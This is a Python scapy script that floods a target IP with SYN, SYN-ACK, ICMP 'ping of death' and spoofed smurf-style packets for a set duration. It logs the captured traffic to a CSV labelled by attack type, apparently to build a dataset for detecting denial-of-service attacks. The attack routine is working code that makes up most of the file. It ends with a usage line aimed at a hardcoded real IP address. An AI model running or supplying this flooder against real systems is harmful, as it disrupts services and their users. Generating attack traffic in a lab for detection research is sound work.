from scapy.all import *
import ipaddress
import argparse
import random
import time
import threading
from SniffnDetect.sniffndetect import *
import asyncio
import csv

sniffer = SniffnDetect()
sniffing = True



# Create a header for the CSV file
header = ['Timestamp', 'Source IP', 'Source Port', 'Destination IP', 'Destination Port', 'Protocol', 'Bytes', 'Attack Type']

def checkRequests(csvwriter, attack_type):
    global sniffer, sniffing

    print('Working')
    while sniffing:
        if sniffer.RECENT_ACTIVITIES:
            data = []
            for pkt in sniffer.RECENT_ACTIVITIES[::-1]:
                bytes_size = f"0"
                if pkt[8]:
                    bytes_size = f"{pkt[8]}"
                if (pkt[3] == "163.173.228.225"):
                    csvwriter.writerow([f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(pkt[0]))}", f"{pkt[2]}", f"{pkt[6]}",  f"{pkt[3]}", f"{pkt[7]}", f"{'|'.join(pkt[1])}", bytes_size, attack_type])
                    # print(pkt)
    print('Stoped sniffing')

def ddos (target_ip, type, duration) :
    global sniffing
    target_port = 12345
    start_time = time.time()

    print('DDOS started')
    while (time.time() - start_time) < duration:
        if type == "syn_flood":
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
        if type == "pod":
            load = 60
            pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)
            send(pkt, verbose=0)
        if type == "syn_ack":
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
            send(pkt, verbose=0)
        if type == "smurf":
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()
            send(pkt, verbose=0)
    sniffing = False
    print('DDOS ended')

# Variables
# target_ip = "163.173.228.225"
# type = 'syn_ack'                  # syn_flood     pod     syn_ack     smurf

parser = argparse.ArgumentParser(description="Simulate DoS attacks on a target IP.")
parser.add_argument("target", type=str, help="Target IP address for the attack")
parser.add_argument("attack_type", type=str, choices=["syn_flood", "pod", "syn_ack", "smurf"], help="Type of attack to perform")
parser.add_argument("duration", type=int, help="Duration of the attack in seconds")

args = parser.parse_args()

# with open(csv_filename, 'w', newline='') as csvfile:
#     csvwriter = csv.writer(csvfile)
#     csvwriter.writerow(header)
#     snif_task = asyncio.create_task(checkRequests())
#     await asyncio.gather(snif_task)
#     ddos(args.target, args.attack_type, args.duration)

def main():

    parser = argparse.ArgumentParser(description="Simulate DoS attacks on a target IP.")
    parser.add_argument("target", type=str, help="Target IP address for the attack")
    parser.add_argument("attack_type", type=str, choices=["syn_flood", "pod", "syn_ack", "smurf"], help="Type of attack to perform")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds")

    args = parser.parse_args()

    csv_filename = f"{args.attack_type}_logs.csv"

    with open(csv_filename, 'w', newline='') as csvfile:
        csvwriter = csv.writer(csvfile)
        csvwriter.writerow(header)

        # Run the DDoS attack in a separate thread to avoid blocking
        sniffing_thread = threading.Thread(target=checkRequests, args=(csvwriter,args.attack_type,))
        ddos_thread = threading.Thread(target=ddos, args=(args.target, args.attack_type, args.duration,))
        sniffing_thread.start()
        ddos_thread.start()


        # Await the sniffing task while the DDoS attack is ongoing
        sniffer.start()
        ddos_thread.join()
        sniffing_thread.join()



        # Wait for the sniffing task to complete
        # await snif_task




# Run the asynchronous main function
if __name__ == "__main__":
    # asyncio.run(main())
    main()
# sudo python attacks.py 163.173.228.225 syn_flood 10